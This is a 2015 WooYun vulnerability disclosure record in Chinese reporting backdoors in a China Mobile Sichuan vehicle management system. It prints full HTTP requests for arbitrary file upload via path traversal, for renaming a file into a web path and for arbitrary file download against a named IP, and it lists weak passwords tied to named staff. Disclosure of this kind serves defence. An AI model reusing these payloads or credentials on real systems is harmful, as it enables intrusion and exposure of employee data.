{"id": 27047, "wybug_id": "wooyun-2015-0119898", "wybug_title": "中国移动某通用系统两个后门/可任意上传/下载/打包数据库/调试代码", "wybug_corp": "中国移动", "wybug_author": "xxlegend", "wybug_date": "2015-06-15 10:04", "wybug_open_date": "2015-09-17 17:30", "wybug_type": "设计缺陷/逻辑错误", "wybug_level": "高", "wybug_rank_0": "20", "wybug_status": "已交由第三方合作机构(cncert国家互联网应急中心)处理", "wybug_from": "http://www.wooyun.org", "wybug_tags": ["任意文件写入利用", "后门"], "wybug_detail": "漏洞详情 披露状态：   \t\t\t\t\t\t\t\t\t2015-06-15：\t细节已通知厂商并且等待厂商处理中\t\t\t\t\t\t\t\t\t2015-06-19：\t厂商已经确认，细节仅向厂商公开\t\t\t\t\t\t\t\t\t2015-06-22：\t细节向第三方安全合作伙伴开放\t\t\t\t\t\t\t\t\t2015-08-13：\t细节向核心白帽子及相关领域专家公开\t\t\t\t\t\t\t\t\t2015-08-23：\t细节向普通白帽子公开\t\t\t\t\t\t\t\t\t2015-09-02：\t细节向实习白帽子公开\t\t\t\t\t\t\t\t\t2015-09-17：\t细节向公众公开  简要描述： 中国移动某通用车辆管理系统系统两个后门，可任意上传，下载，打包数据库，调试代码，可导出几万移动员工信息，还附带各种弱口令 详细说明：  四川移动车辆管理平台统一入口，涉及到几十个分公司，几十个站点http://www.zh-beidou.com/sichuanyidongchelianganquanguanlixitongrukou/拿巴中分公司做实验，http://117.172.133.2后门1：数据备份接口，在这个接口可下载任意文件，上传，重命名任意文件\n\n\nPOST http://117.172.133.2/cgi-bin/upload.asp?destPath=upload/database_backup/&autoUnzip=unzip_delete HTTP/1.1Host: 117.172.133.2Proxy-Connection: keep-aliveContent-Length: 258Cache-Control: max-age=0Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8Origin: http://117.172.133.2User-Agent: Mozilla/5.0 (Windows NT 6.3; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/41.0.2272.118 Safari/537.36Content-Type: multipart/form-data; boundary=----WebKitFormBoundaryWWf2B3XWh3UuaYWZReferer: http://117.172.133.2/html/admin/databaseBackup.htmlAccept-Encoding: gzip, deflateAccept-Language: en-US,en;q=0.8,zh-CN;q=0.6,zh;q=0.4,zh-TW;q=0.2Cookie: JSESSIONID=C47295A7C9BCC356873671A8CF54DE4D; __TIAS_SESSIONID__=c55e8b9c588e468a8959bb68aa76c9d0; tidyinfo.language=%22cn%22; tias_onlineid=23837; tias_online_account=admin; tias_online_username=\\u7ba1\\u7406\\u5458; tias_online_uid=1; tidyinfo.username=%22admin%22; tidyinfo.project=%22cgi-bin%22; tidyinfo.projectName=%22%u9996%u9875%22; tidyinfo.appBaseURL=%22/cgi-bin/%22------WebKitFormBoundaryWWf2B3XWh3UuaYWZContent-Disposition: form-data; name=\"file\"; filename=\"../../ckfinder/core/connector/php/php4/Core/get.php\"Content-Type: application/octet-stream<?php phpinfo(); ?>------WebKitFormBoundaryWWf2B3XWh3UuaYWZ—\n\n\n重命名：\nPOST http://117.172.133.2/cgi-bin/submit.asp HTTP/1.1Host: 117.172.133.2Proxy-Connection: keep-aliveContent-Length: 140Origin: http://117.172.133.2X-Requested-With: Ext.basexUser-Agent: Mozilla/5.0 (Windows NT 6.3; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/41.0.2272.118 Safari/537.36Content-Type: application/x-www-form-urlencoded; charset=UTF-8Accept: */*Referer: http://117.172.133.2/html/admin/databaseBackup.htmlAccept-Encoding: gzip, deflateAccept-Language: en-US,en;q=0.8,zh-CN;q=0.6,zh;q=0.4,zh-TW;q=0.2Cookie: JSESSIONID=646301839280971C6BEABDFBF87203E6; __TIAS_SESSIONID__=c55e8b9c588e468a8959bb68aa76c9d0; tidyinfo.language=%22cn%22; tias_onlineid=23837; tias_online_account=admin; tias_online_username=\\u7ba1\\u7406\\u5458; tias_online_uid=1; tidyinfo.username=%22admin%22; tidyinfo.project=%22cgi-bin%22; tidyinfo.projectName=%22%u9996%u9875%22; tidyinfo.appBaseURL=%22/cgi-bin/%22module=pd_database_backup&action=rename&filename=201506100392.php&newfilename=../../ckfinder/core/connector/php/php4/Core/get.php&projectId=HTTP/1.1 200 OKContent-Type: text/html;charset=UTF-8Connection: keep-aliveDate: Wed, 10 Jun 2015 14:39:14 GMTServer: XiaoYun.Smart.RouterPragma: No-cacheCache-Control: no-cacheExpires: Thu, 01 Jan 1970 00:00:00 GMTVary: Accept-EncodingContent-Length: 26{\"success\":true,\"emsg\":\"\"}\n下载：\nGET http://117.172.133.2/cgi-bin/submit.asp?module=pd_database_backup&action=download&file=../..//ckfinder/core/connector/php/php4/Core/get.php&projectId= HTTP/1.1Host: 117.172.133.2Proxy-Connection: keep-aliveAccept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8User-Agent: Mozilla/5.0 (Windows NT 6.3; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/41.0.2272.118 Safari/537.36Referer: http://117.172.133.2/html/admin/databaseBackup.htmlAccept-Encoding: gzip, deflate, sdchAccept-Language: en-US,en;q=0.8,zh-CN;q=0.6,zh;q=0.4,zh-TW;q=0.2Cookie: JSESSIONID=646301839280971C6BEABDFBF87203E6; __TIAS_SESSIONID__=c55e8b9c588e468a8959bb68aa76c9d0; tidyinfo.language=%22cn%22; tias_onlineid=23837; tias_online_account=admin; tias_online_username=\\u7ba1\\u7406\\u5458; tias_online_uid=1; tidyinfo.username=%22admin%22; tidyinfo.project=%22cgi-bin%22; tidyinfo.projectName=%22%u9996%u9875%22; tidyinfo.appBaseURL=%22/cgi-bin/%22\n\n\n2，另一个后门，可调试服务器上代码： http://117.172.133.2/cgi-bin/debug.html 3，附带弱口令弱口令：admin:1 内置无法删除，修改配置员:111111张俊芳：111222张良彬:222222 一大批人使用申请个闪电吧   漏洞证明：     修复方案：  把这些后门都关了，移动公司的人都不知道有这些后门，哎   版权声明：转载请注明来源 xxlegend@乌云\n ", "wybug_reply": "漏洞回应  厂商回应： 危害等级：中 漏洞Rank：10  确认时间：2015-06-19 17:28 厂商回复： CNVD确认并复现所述情况，已经转由CNCERT向四川移动通报，由其后续协调网站管理部门处置。  最新状态： 暂无  ", "replys": "漏洞评价：\n评论\n  \n\n\n", "wybug_level_fromcorp": "中", "wybug_rank_fromcorp": 10, "Ranks": null}